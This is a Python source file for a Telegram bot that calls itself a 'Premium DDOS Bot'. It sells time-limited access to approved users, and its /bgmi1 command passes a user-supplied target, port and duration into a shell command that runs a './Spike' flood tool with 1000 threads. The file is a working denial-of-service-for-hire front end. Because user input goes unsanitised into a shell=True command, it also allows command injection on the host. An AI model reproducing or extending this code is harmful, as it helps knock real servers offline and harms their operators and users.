import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')

# Admin user IDs
admin_id = ["7533233807"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to store approval expiry dates
user_approval_expiry = {}

# Predefined packet size and thread
PACKETSIZE = 9
THREAD = 1000

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\nPacket Size: {PACKETSIZE}\nThread: {THREAD}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read().strip() == "":
                return "Logs already cleared."
            else:
                file.truncate(0)
                return "Logs cleared successfully."
    except FileNotFoundError:
        return "Log file not found."

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        return str(remaining_time) if remaining_time.days >= 0 else "Expired"
    else:
        return "N/A"

# Function to set approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ["hour", "hours"]:
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ["day", "days"]:
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ["week", "weeks"]:
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ["month", "months"]:
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ['hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months']:
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')}."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists."
        else:
            response = "Please provide user ID and duration (e.g., 1day, 2days, 1week)."
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = (f"Your Info:\n\nUser ID: {user_id}\nUsername: {username}\nRole: {user_role}\n"
                f"Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n"
                f"Remaining Approval Time: {remaining_time}")
    bot.reply_to(message, response)

# Command handler for removing a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = "User removed successfully."
            else:
                response = "User not found."
        else:
            response = "Please provide a user ID to remove."
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

# Command handler for clearing logs
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Command handler for clearing users
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                if file.read().strip() == "":
                    response = "No users found."
                else:
                    file.truncate(0)
                    response = "Users cleared successfully."
        except FileNotFoundError:
            response = "User file not found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Command handler for showing all authorized users
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n" + "\n".join([f"- User ID: {uid}" for uid in user_ids])
                else:
                    response = "No users found."
        except FileNotFoundError:
            response = "User file not found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Command handler for showing recent logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            response = "Log file is empty or not found."
            bot.reply_to(message, response)
    else:
        response = "You are not authorized to use this command."
        bot.reply_to(message, response)

# Command handler for the /bgmi1 command
@bot.message_handler(commands=['bgmi1'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            
            if time > 240:
                response = "⚠️ Time must be less than 240 seconds."
            else:
                # Log the command
                log_command(user_id, target, port, time)
                
                # Start the attack
                response = f"🚩 Attack started on target {target} for {time} seconds on port {port} with packet size {PACKETSIZE} and {THREAD} threads."
                full_command = f"./Spike {target} {port} {time} {PACKETSIZE} {THREAD}"
                process = subprocess.run(full_command, shell=True)
                
                # Notify the user that the attack is finished
                response += f"\n\nAttack finished."
                bot.reply_to(message, response)
        else:
            response = "⚠️ Invalid command format. Use: /bgmi1 <target> <port> <time>"
            bot.reply_to(message, response)
    else:
        response = "You are not authorized to use this command."
        bot.reply_to(message, response)

# Command handler for showing user command logs
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                response = "Your Command Logs:\n" + "".join(user_logs) if user_logs else "No logs found."
        except FileNotFoundError:
            response = "Log file not found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Command handler for showing help
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
- /add <userId> <duration>: Add a User.
- /remove <userId>: Remove a User.
- /allusers: List authorized users.
- /logs: Show recent logs.
- /clearlogs: Clear logs.
- /clearusers: Clear users.
- /myinfo: Show your info.
- /bgmi1 <target> <port> <time>: Start an attack.
- /mylogs: Show your command logs.
- /help: Show this help message.'''
    bot.reply_to(message, help_text)

# Command handler for showing welcome message
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to MOD× Premium DDOS Bot, {user_name}! Try /help for available commands."
    bot.reply_to(message, response)

# Command handler for broadcasting a message to all users
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message to all users from Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)